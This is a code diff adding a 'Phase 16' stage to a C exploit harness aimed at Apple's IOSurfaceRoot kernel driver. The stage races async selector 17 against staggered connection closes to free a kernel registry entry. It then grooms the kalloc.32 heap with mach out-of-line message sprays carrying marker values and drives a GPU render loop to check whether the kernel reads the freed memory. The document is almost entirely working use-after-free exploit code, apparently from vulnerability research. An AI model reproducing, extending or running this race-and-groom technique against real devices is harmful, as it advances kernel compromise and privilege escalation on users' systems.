@@ -16864,6 +16864,10 @@ new_modes:
             rlog("*** rounds=%d: fast-path to Phase 15 ***\n", rounds);
             goto phase14_done;
         }
+        if (rounds >= 160 && rounds <= 165) {
+            rlog("*** rounds=%d: fast-path to Phase 16 ***\n", rounds);
+            goto phase15_done;
+        }
 
         /* Open IOSurfaceRoot user client */
         io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
@@ -19755,6 +19759,174 @@ new_modes:
         }
         phase15_done:
         rlog("--- Phase 15 complete ---\n");
+
+        /*
+         * Phase 16: Separated race + groom + GPU walk
+         *
+         * Phase 15 showed that CONCURRENT groom during render loop crashes
+         * regardless — the GPU hits the freed entry before groom lands.
+         *
+         * New approach: sequential, not concurrent:
+         *   1. Race (NO render loop) → free registry entry
+         *   2. Groom with mach OOL messages (reliable kalloc.32 spray)
+         *   3. THEN start render loop → GPU reads groomed data
+         *   4. Stop render loop, check results
+         *
+         * Also switches groom primitive from sel1000 (might not persist)
+         * to mach_msg OOL descriptors (reliable kalloc spray).
+         *
+         * rounds=160: safe groom [0, 0, 0] — should NOT crash
+         * rounds=161: marker groom [0, 0xCAFE, 0] — test if kernel reads slot 1
+         * rounds=162: marker groom [0, 0, 0xBEEF] — test if kernel reads slot 2
+         */
+        if (rounds >= 160 && rounds <= 165) {
+            rlog("\n--- Phase 16: Sequential race→groom→GPU (test %d) ---\n",
+                 rounds - 160);
+
+            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC),
+                dispatch_get_global_queue(0, 0), ^{
+                    rlog("  WATCHDOG: 15s — terminating\n");
+                    if (g_log) { fclose(g_log); g_log = NULL; }
+                    _exit(42);
+                });
+
+            io_service_t svc16 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            if (!svc16) { rlog("  Phase 16: service lookup failed\n"); goto phase16_done; }
+
+            /* Build groom pattern based on test */
+            uint8_t groom16[32]; /* kalloc.32 to cover 24-byte entries */
+            memset(groom16, 0, sizeof(groom16));
+            uint64_t *g16 = (uint64_t *)groom16;
+
+            if (rounds == 160) {
+                rlog("  Groom: all zero (safe control)\n");
+            } else if (rounds == 161) {
+                g16[1] = 0xCAFECAFECAFECAFEULL;
+                rlog("  Groom: slot1=0xCAFE (test +0x08 read)\n");
+            } else if (rounds == 162) {
+                g16[2] = 0xBEEFBEEFBEEFBEEFULL;
+                rlog("  Groom: slot2=0xBEEF (test +0x10 read)\n");
+            } else if (rounds == 163) {
+                g16[0] = 0xDEADDEADDEADDEADULL;
+                rlog("  Groom: slot0=0xDEAD (confirm +0x00 is next ptr)\n");
+            } else if (rounds == 164) {
+                rlog("  No groom, no render (baseline — should survive)\n");
+            } else if (rounds == 165) {
+                rlog("  No groom, with render (should crash like Phase 13)\n");
+            }
+
+            uint64_t inp16[3] = {1, 2, 3};
+
+            for (int iter = 0; iter < 20; iter++) {
+                /* ---- STEP 1: Race WITHOUT render loop ---- */
+                io_connect_t cs16[8];
+                int have16[8];
+                for (int i = 0; i < 8; i++) {
+                    have16[i] = (IOServiceOpen(svc16, mach_task_self(), 0, &cs16[i]) == KERN_SUCCESS);
+                    if (have16[i]) {
+                        mach_port_t twp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                        mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t ref = 0x1122334455667788ULL;
+                        IOConnectCallAsyncMethod(cs16[i], 17, twp, &ref, 1,
+                            NULL, 0, inp16, 24, NULL, NULL, NULL, NULL);
+                        mach_port_deallocate(mach_task_self(), twp);
+                    } else cs16[i] = IO_OBJECT_NULL;
+                }
+
+                p13_spam_run = 1;
+                p13_spam_conn = have16[0] ? cs16[0] : IO_OBJECT_NULL;
+                p13_spam_shape = 1;
+                p13_spam_count = 0;
+                pthread_t spam16[16];
+                for (int t = 0; t < 16; t++)
+                    pthread_create(&spam16[t], NULL, p13_spam_reg, NULL);
+
+                /* Stagger close — race window */
+                for (int i = 7; i >= 0; i--) {
+                    if (have16[i]) { IOServiceClose(cs16[i]); have16[i] = 0; }
+                    usleep(100);
+                }
+
+                p13_spam_run = 0;
+                for (int t = 0; t < 16; t++) pthread_join(spam16[t], NULL);
+                for (int i = 0; i < 8; i++) if (have16[i]) IOServiceClose(cs16[i]);
+
+                rlog("  [%d] race done, spam=%llu\n", iter,
+                     (unsigned long long)p13_spam_count);
+
+                /* ---- STEP 2: Groom with OOL mach messages ---- */
+                mach_port_t groom_port16 = MACH_PORT_NULL;
+                int groom_sent = 0;
+
+                if (rounds <= 162 || rounds == 163) {
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
+                                       &groom_port16);
+                    mach_port_insert_right(mach_task_self(), groom_port16,
+                                           groom_port16, MACH_MSG_TYPE_MAKE_SEND);
+                    /* Raise queue limit */
+                    mach_port_limits_t limits = { .mpl_qlimit = MACH_PORT_QLIMIT_MAX };
+                    mach_port_set_attributes(mach_task_self(), groom_port16,
+                        MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits,
+                        MACH_PORT_LIMITS_INFO_COUNT);
+
+                    struct {
+                        mach_msg_header_t header;
+                        mach_msg_body_t body;
+                        mach_msg_ool_descriptor_t ool;
+                    } ool_msg;
+                    memset(&ool_msg, 0, sizeof(ool_msg));
+                    ool_msg.header.msgh_bits = MACH_MSGH_BITS_COMPLEX |
+                        MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+                    ool_msg.header.msgh_size = sizeof(ool_msg);
+                    ool_msg.header.msgh_remote_port = groom_port16;
+                    ool_msg.header.msgh_local_port = MACH_PORT_NULL;
+                    ool_msg.body.msgh_descriptor_count = 1;
+                    ool_msg.ool.address = groom16;
+                    ool_msg.ool.size = 32; /* target kalloc.32 (covers 24-byte entries) */
+                    ool_msg.ool.deallocate = 0;
+                    ool_msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                    ool_msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                    for (int g = 0; g < 512; g++) {
+                        kern_return_t mr = mach_msg(&ool_msg.header,
+                            MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                            sizeof(ool_msg), 0, MACH_PORT_NULL, 10,
+                            MACH_PORT_NULL);
+                        if (mr == MACH_MSG_SUCCESS) groom_sent++;
+                        else break;
+                    }
+                }
+
+                rlog("  [%d] groom sent=%d\n", iter, groom_sent);
+
+                /* ---- STEP 3: Start render loop → GPU reads groomed data ---- */
+                int did_render = (rounds != 164);
+                if (did_render) {
+                    p13_render_run = 1;
+                    p13_render_frames = 0;
+                    pthread_t render_th16;
+                    pthread_create(&render_th16, NULL, p13_render_loop, NULL);
+                    usleep(500000); /* let GPU do several walks */
+                    p13_render_run = 0;
+                    pthread_join(render_th16, NULL);
+                    rlog("  [%d] render done, frames=%d\n", iter, p13_render_frames);
+                }
+
+                /* ---- STEP 4: Cleanup ---- */
+                if (groom_port16 != MACH_PORT_NULL)
+                    mach_port_destroy(mach_task_self(), groom_port16);
+
+                rlog("  [%d] survived (%s)\n", iter,
+                     did_render ? "with render" : "no render");
+            }
+
+            rlog("  Phase 16: All 20 iterations survived!\n");
+            IOObjectRelease(svc16);
+        }
+        phase16_done:
+        rlog("--- Phase 16 complete ---\n");
 
         rlog("\n=== IOSURFACE_SEL17 complete ===\n");
     }
